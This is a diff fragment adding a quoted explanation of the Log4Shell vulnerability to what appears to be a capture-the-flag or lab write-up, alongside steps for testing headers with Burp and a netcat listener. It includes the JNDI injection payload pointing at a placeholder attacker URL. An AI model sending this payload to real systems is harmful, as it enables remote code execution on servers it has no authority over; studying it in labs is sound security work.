@@ -112,6 +112,13 @@ Seems like a dead end. The comment here tells us that its vulnerabele
 
 ## Testing for log4j
 
+
+> The Log4shell (CVE-2021–44228) vulnerability affects how Log4j processes log messages. By sending specially crafted messages to a system that uses Log4j, a threat actor can cause the system to load external code, leading to an RCE.
+>
+> Attackers can take advantage of it by just inserting a line of code like ${jndi:ldap://[attacker_URL]} 
+
+
+
 Intercept the request in burp and send it to repeater tab. Set up a netcat listener on your terminal to look for any incoming connections . 
 
 First lets test for log4j on `User-Agent` header.
